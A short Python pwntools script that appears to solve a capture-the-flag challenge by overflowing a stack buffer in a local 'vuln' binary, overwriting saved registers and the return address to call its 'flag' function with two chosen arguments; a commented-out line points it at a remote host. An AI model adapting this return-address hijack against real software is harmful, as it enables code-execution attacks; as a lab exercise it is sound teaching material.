#!/usr/bin/env python3 

from pwn import *

buffer = b'A'*180

vuln = ELF('./vuln')

flag_address = p32(vuln.symbols['flag'])

EBX = p32(0x0804bf10)

EBP = b'BBBB'

EIP = flag_address

FILL = b'CCCC'

Arg1 = p32(0xdeadbeef)

Arg2 = p32(0xc0ded00d)

payload = buffer + EBX + EBP + EIP + FILL + Arg1 + Arg2

binary = process('./vuln')
#binary = remote('161.35.172.171',31319)
binary.sendline(payload)
success(f'Flag Found! ---> {binary.recvline_contains(b"Flag").strip().decode()}')
